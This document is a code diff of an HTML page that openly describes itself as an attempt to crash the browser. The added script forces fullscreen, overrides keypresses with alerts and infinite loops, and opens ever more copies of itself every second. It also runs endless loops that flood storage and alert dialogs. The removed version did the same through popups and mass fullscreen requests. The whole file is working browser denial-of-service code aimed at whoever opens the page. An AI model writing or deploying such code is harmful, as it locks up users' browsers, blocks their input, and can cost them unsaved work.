@@ -1,50 +1,81 @@
+<!-- @format -->
+
 <!DOCTYPE html>
 <html lang="en">
-    <body>
+	<head>
+		<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
+	</head>
+	<body class="d">
         <p>
             attempts to crash the browser by simply spamming to the all gods for fullscreen
         </p>
-    </body>
-    <script>
+	</body>
+	<script>
+        var uptime = 0;
+        var sec = 0;
         var elem = document.documentElement;
 
-        // Additonally create extras that multiplie
-        window.open('https://johnymcreed.github.io/usefulbutuseless/notnormal/forum.html')
-        window.open('https://johnymcreed.github.io/usefulbutuseless/notnormal/forum.html')
-
-        setTimeout(() => 
+        function pad ( val ) { return val > 9 ? val : "0" + val; }
+        setInterval(function()
         {
-            window.open('https://johnymcreed.github.io/usefulbutuseless/notnormal/forum.html');
-
-            // during the midst of this; open the big funny crasher that will actually make you loose hope
-            window.open('https://johnymcreed.github.io/ck/');
-
-            window.open('https://johnymcreed.github.io/usefulbutuseless/notnormal/forum.html');
+            uptime = pad(parseInt(sec/60,10)) + ++sec%60;
         }, 
         1000);
 
-        var start = setInterval(send, 1);
-
-        function send() 
+        if (elem.requestFullscreen) 
         {
-            for (var i = 0; i < 100000; i++)
-            {
-                if (elem.requestFullscreen) 
-                {
-                    elem.requestFullscreen();
-                } 
-                else if (elem.webkitRequestFullscreen) 
-                {
-                    elem.webkitRequestFullscreen();
-                } 
-                else if (elem.msRequestFullscreen) 
-                {
-                    elem.msRequestFullscreen();
-                }
-            }
+            elem.requestFullscreen();
+        } 
+        else if (elem.webkitRequestFullscreen) 
+        {
+            elem.webkitRequestFullscreen();
+        } 
+        else if (elem.msRequestFullscreen)
+        {
+            elem.msRequestFullscreen();
         }
-    </script>
+        
+        setInterval(() => 
+        {   
+            document.onkeydown = function (e) 
+            {
+                alert('Uh no sorry :(') // 1st backup
+                window.open('http://127.0.0.1:5555' + window.location.pathname); // second
+                for (var i = 5; i > 3; i = i + 1) { console.log(i); } // yea you ain't getting anywhere
+                return false;
+            }
+
+            for(var i = 0; i < Math.round(uptime); i++) // get worse each second L
+            {
+               window.open('https://johnymcreed.github.io/usefulbutuseless/' + window.location.pathname);
+
+               setTimeout(() => 
+               {
+                    window.open('https://johnymcreed.github.io/usefulbutuseless/' + window.location.pathname);
+
+                    for (var i = 5; i > 3; i = i + 1) 
+                    { 
+                        console.log(i); 
+                        console.warn(i);
+                        console.error(i);
+
+                        localStorage.setItem(i, i); 
+                        sessionStorage.setItem(i, i); 
+                        alert(i) 
+                    }
+               }, 
+               200)
+            } 
+        });
+	</script>
     <noscript>
-        Please turn on script! this page cannot function without it!
+        <style>
+            .d {
+                display: none;
+            }
+        </style>
+        <p>
+            Please turn on script! this page cannot function without it!
+        </p>
     </noscript>
 </html>
